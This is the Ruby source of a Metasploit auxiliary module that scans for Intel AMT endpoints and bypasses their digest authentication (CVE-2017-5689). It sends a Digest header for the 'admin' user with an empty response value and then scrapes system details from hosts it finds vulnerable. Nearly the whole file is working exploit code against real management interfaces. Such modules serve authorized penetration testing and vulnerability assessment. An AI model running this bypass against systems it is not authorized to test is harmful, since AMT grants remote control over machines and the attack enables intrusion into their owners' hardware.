##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Intel AMT Digest Authentication Bypass Scanner',
      'Description' => %q{
        This module scans for Intel Active Management Technology endpoints and attempts
        to bypass authentication using a blank HTTP digest (CVE-2017-5689). This service
        can be found on ports 16992, 16993 (tls), 623, and 624 (tls).
      },
      'Author'      => 'hdm',
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2017-5689' ],
          [ 'URL', 'https://www.embedi.com/news/what-you-need-know-about-intel-amt-vulnerability' ],
          [ 'URL', 'https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00075&languageid=en-fr' ],
        ],
      'DisclosureDate' => 'May 05 2017'
    )

    register_options(
      [
        Opt::RPORT(16992),
      ])
  end

  # Fingerprint a single host
  def run_host(ip)
    begin
      connect
      res = send_request_raw({ 'uri' => '/hw-sys.htm', 'method' => 'GET' })
      unless res && res.headers['Server'].to_s.index('Intel(R) Active Management Technology')
        disconnect
        return
      end

      vprint_status("#{ip}:#{rport} - Found an Intel AMT endpoint: #{res.headers['Server']}")

      unless res.headers['WWW-Authenticate'] =~ /realm="([^"]+)".*nonce="([^"]+)"/
        vprint_status("#{ip}:#{rport} - AMT service did not send a valid digest response")
        disconnect
        return
      end

      realm = $1
      nonce = $2
      cnonce = Rex::Text.rand_text(10)

      res = send_request_raw(
        {
          'uri'     => '/hw-sys.htm',
          'method'  => 'GET',
          'headers' => {
            'Authorization' =>
              "Digest username=\"admin\", realm=\"#{realm}\", nonce=\"#{nonce}\", uri=\"/hw-sys.htm\", " +
              "cnonce=\"#{cnonce}\", nc=1, qop=\"auth\", response=\"\""
          }
        })

      unless res && res.body.to_s.index("Computer model")
        vprint_error("#{ip}:#{rport} - AMT service does not appear to be vulnerable")
        return
      end

      proof = res.body.to_s
      proof_hash = nil

      info_keys = res.body.scan(/<td class=r1><p>([^\<]+)(?:<\/p>)?/).map{|x| x.first.to_s.gsub("&#x2F;", "/") }
      if info_keys.length > 0
        proof_hash = {}
        proof = ""

        info_vals = res.body.scan(/<td class=r1>([^\<]+)</).map{|x| x.first.to_s.gsub("&#x2F;", "/") }
        info_keys.each do |ik|
          iv = info_vals.shift
          break unless iv
          proof_hash[ik] = iv
          proof << "#{iv}: #{ik}\n"
        end
      end

      print_good("#{ip}:#{rport} - Vulnerable to CVE-2017-5689 #{proof_hash.inspect}")

      report_note(
        :host  => ip,
        :proto => 'tcp',
        :port  => rport,
        :type  => 'intel.amt.system_information',
        :data  => proof_hash
      )

      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => 'tcp',
        :name  => "Intel AMT Digest Authentication Bypass",
        :refs  => self.references,
        :info => proof
      })

    rescue ::Timeout::Error, ::Errno::EPIPE
    ensure
      disconnect
    end
  end
end
